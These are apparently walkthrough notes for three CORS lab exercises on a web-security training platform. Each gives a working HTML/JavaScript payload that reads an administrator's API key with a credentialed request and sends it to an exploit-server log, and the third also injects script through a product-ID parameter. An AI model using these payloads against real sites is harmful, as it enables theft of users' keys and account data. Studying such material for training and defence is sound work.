### CORS vulnerability with basic origin reflection

The API Key value is retrieved in the /accountDetails request. You can see it has the "Access-Control-Allow-Credentials: true", so it is related to CORS.
Try adding a Origin: https://example.com and you will see it's reflected. So, its vulnerable because is trusting in any origin you set, so the request asking for the administrator API Key is able to have any origin and the app will trust.

Payload:
```HTML
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

---
### CORS vulnerability with trusted null origin

This exercise is the same as previous one, but it allows a malicious user to set the Origin: `null`. For this reason, the payload we will use is with an iframe sandbox, to generate a null origin request. 

Payload:
```HTML
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

---
### CORS vulnerability with trusted insecure protocols

When yo access a product, you can see it's opening a new window http://stock.LAB-ID, so you will craft the payload for this:

```HTML
<script>
	document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

